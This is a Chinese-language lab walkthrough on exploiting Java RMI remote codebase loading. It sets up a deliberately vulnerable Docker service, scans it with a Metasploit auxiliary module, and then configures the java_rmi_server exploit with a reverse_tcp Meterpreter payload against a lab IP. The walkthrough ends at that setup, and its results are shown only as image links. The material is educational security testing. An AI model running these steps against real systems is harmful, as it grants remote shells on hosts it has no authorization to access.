### 1、漏洞原理
```shell script
Java Remote Method Invocation 用于在Java中进行远程调用，在满足一定条件的情况下，RMI客户端通过指定
java.rmi.server.codebase 可以让服务端远程加载对象，进而加载远程java字节码执行任意代码
```
### 2、漏洞环境搭建
Dockerfile
```dockerfile
FROM openjdk:8u222-jdk

LABEL maintainer="phithon <root@leavesongs.com>"

ENV RMIIP="127.0.0.1"
COPY src/ /usr/src/
WORKDIR /usr/src

RUN set -ex \
    && javac *.java

EXPOSE 1099
EXPOSE 64000

CMD ["bash", "-c", "java -Djava.rmi.server.hostname=${RMIIP} -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer"]
```
docker-compose.yaml
```yaml
version: '2'
services:
  rmi:
    network_mode: bridge
    build: .
    ports:
      - "1099:1099"
      - "64000:64000"
    environment:
      - RMIIP=127.0.0.1
```
```shell script
docker-compose build 
docker-compose up -d
```
### 3、检查漏洞
```shell script
search java_rmi
use auxiliary/scanner/misc/java_rmi_server
```
### 4、设置检查参数
```shell script
msf6 auxiliary(scanner/misc/java_rmi_server) > set rhosts 172.16.120.252
rhosts => 172.16.120.252
msf6 auxiliary(scanner/misc/java_rmi_server) > options

Module options (auxiliary/scanner/misc/java_rmi_server):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   172.16.120.252   yes       The target host(s), see https://github.com/rapid7/metasploit-framewo
                                       rk/wiki/Using-Metasploit
   RPORT    1099             yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)
```
### 5、开始检查
```shell script
![image](https://github.com/498946975/Security/blob/master/images/java_rmi_1.png)
```
### 6、设置攻击参数
```shell script
msf6 auxiliary(scanner/misc/java_rmi_server) > back 
msf6 > use exploit/multi/misc/java_rmi_server
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/misc/java_rmi_server) >
```
#### 设置payload，和攻击ip
```shell script
set payload java/meterpreter/reverse_tcp
set rhosts  172.16.120.252
```
![image](https://github.com/498946975/Security/blob/master/images/java_rmi_2.png)


